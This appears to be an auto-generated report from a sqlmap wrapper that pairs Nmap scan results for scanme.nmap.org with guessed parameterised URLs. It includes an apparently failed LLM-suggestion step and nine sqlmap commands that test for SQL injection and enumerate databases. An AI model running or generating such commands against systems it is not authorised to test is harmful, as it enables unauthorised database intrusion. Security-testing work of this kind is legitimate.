# sqlmap wrapper report

Generated: Thu Aug 21 00:40:10 2025


## Assets extracted from Nmap

- 45.33.32.156:80 (http) product='Apache httpd' version='2.4.7' hostname='scanme.nmap.org'


## Candidate URLs

### 45.33.32.156:80

- http://scanme.nmap.org/?id=1

- http://scanme.nmap.org/index.php?id=1

- http://scanme.nmap.org/page.php?id=1

- http://scanme.nmap.org/product.php?id=1

- http://scanme.nmap.org/view.php?id=1

- http://scanme.nmap.org/item.php?id=1

- http://scanme.nmap.org/news.php?id=1

- http://scanme.nmap.org/catalog.php?id=1

- http://scanme.nmap.org/article.php?id=1


## LLM suggestions

{
  "error": "HTTPConnectionPool(host='localhost', port=12434): Read timed out. (read timeout=60)"
}

## Generated sqlmap commands

```
python "C:\sqlmap\sqlmap.py" -u "http://scanme.nmap.org/?id=1" --batch --dbs --level=1 --risk=1 --threads=3
```

```
python "C:\sqlmap\sqlmap.py" -u "http://scanme.nmap.org/index.php?id=1" --batch --dbs --level=1 --risk=1 --threads=3
```

```
python "C:\sqlmap\sqlmap.py" -u "http://scanme.nmap.org/page.php?id=1" --batch --dbs --level=1 --risk=1 --threads=3
```

```
python "C:\sqlmap\sqlmap.py" -u "http://scanme.nmap.org/product.php?id=1" --batch --dbs --level=1 --risk=1 --threads=3
```

```
python "C:\sqlmap\sqlmap.py" -u "http://scanme.nmap.org/view.php?id=1" --batch --dbs --level=1 --risk=1 --threads=3
```

```
python "C:\sqlmap\sqlmap.py" -u "http://scanme.nmap.org/item.php?id=1" --batch --dbs --level=1 --risk=1 --threads=3
```

```
python "C:\sqlmap\sqlmap.py" -u "http://scanme.nmap.org/news.php?id=1" --batch --dbs --level=1 --risk=1 --threads=3
```

```
python "C:\sqlmap\sqlmap.py" -u "http://scanme.nmap.org/catalog.php?id=1" --batch --dbs --level=1 --risk=1 --threads=3
```

```
python "C:\sqlmap\sqlmap.py" -u "http://scanme.nmap.org/article.php?id=1" --batch --dbs --level=1 --risk=1 --threads=3
```
